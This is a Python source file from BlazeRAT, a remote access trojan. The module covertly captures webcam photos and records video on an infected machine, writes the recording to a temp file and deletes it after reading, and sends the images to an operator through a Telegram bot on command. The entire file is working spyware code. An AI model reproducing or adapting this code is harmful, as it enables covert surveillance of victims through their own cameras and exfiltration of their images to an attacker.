#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from io import BytesIO
from core.logger import Log
from os import path, remove
from threading import Thread
from tempfile import gettempdir
from core.messages import services as Messages
from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc,\
    flip, imencode # pip3 install opencv-python

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to create photos and videos from the webcam
"""

# Global variables
global file, r, t, camera, output
r, t, camera, output = False, None, None, None
file = path.join(gettempdir(), "webcamera.avi")

""" Check camera by index """
def _CheckCamera(device: int = 0) -> bool:
    camera = VideoCapture(device)
    status = camera.isOpened()
    camera.release()
    return status

""" Capture image """
def _CaptureImage(device: int = 0) -> bytes:
    # Open webcamera
    camera = VideoCapture(device)
    # If failed to open camera
    if not camera.isOpened():
        return False
    # Capture frame
    for _ in range(15):
        _, image = camera.read()
    # Release camera
    camera.release()
    del(camera)
    # Write to memory
    _, buffer = imencode(".jpg", image)
    obj = BytesIO(buffer)
    return obj.getvalue()

""" Capture video from camera """
def _CaptureVideo(device: int = 0) -> None:
    # Initialize
    global r, camera, output, file
    r = True
    camera = VideoCapture(device)
    fourcc = VideoWriter_fourcc(*"XVID")
    output = VideoWriter(file, fourcc, 20.0, (640,480))
    # Capture webcam
    while (r and camera.isOpened()):
        res, frame = camera.read()
        if res:
            frame = flip(frame, 0)
            output.write(frame)
        else:
            break

""" Asynchronously capture video from camera """
def _StartAsync(device: int = 0) -> None:
    global r, t
    if r: return False
    try:
        t = Thread(target=_CaptureVideo, args=(device,))
        t.start()
    except Exception as error:
        print(error)
        r = False
    else:
        return True

""" Stop webcam capture """
def _Stop() -> bytes:
    global r, t, camera, output, file
    if not r: return False
    r = False
    t.join()
    # Release everything if job is finished
    camera.release()
    output.release()
    # Read file and delete
    content = open(file, "rb")
    remove(file)
    return content

""" Handle telegram command """
def Handle(callback: dict, bot) -> None:
    text = callback.data
    chatid = callback.from_user.id
    device = 0
    # Detect camera device
    if "_" in text:
        device = int(text.split('_')[-1])
    # Take screenshot from webcamera
    if "Screenshot" in text:
        bot.send_chat_action(chatid, "upload_photo")
        # Check camera
        if not _CheckCamera(device):
            return bot.send_message(chatid, Messages.webcam_failed_open % device)
        # Log
        Log(f"Webcam >> Create screenshot from device {device}", chatid)
        # Take picture
        screenshot = _CaptureImage(device)
        if screenshot != False:
            bot.send_photo(chatid,
                photo=screenshot,
                caption=Messages.webcam_screenshot_captured,
            )
        # Send error message
        else:
            bot.send_message(chatid, Messages.webcam_failed_open % device)
    # Start webcam recording
    if "Enable" in text:
        # Check camera
        if not _CheckCamera(device):
            return bot.send_message(chatid, Messages.webcam_failed_open % device)
        # Log
        Log(f"Webcam >> Start video recording from device {device}", chatid)
        # Start image recording
        video = _StartAsync(device)
        if video != False:
            bot.send_message(chatid, Messages.webcam_recording_started)
            bot.send_chat_action(chatid, "record_video")
        # Send error message if recording already started
        else:
            bot.send_message(chatid, Messages.webcam_recording_not_stopped)
    # Stop microphone recording
    elif "Disable" in text:
        # Send recorded voice message
        video = _Stop()
        if video != False:
            Log(f"Webcam >> Stop video recording from device {device}", chatid)
            bot.send_chat_action(chatid, "upload_video")
            bot.send_video_note(
                chatid, video,
                reply_to_message_id=callback.message.message_id,
            )
            bot.send_message(chatid, Messages.webcam_recording_stopped)
        # Send error message if recording not started
        else:
            bot.send_message(chatid, Messages.webcam_recording_not_started)
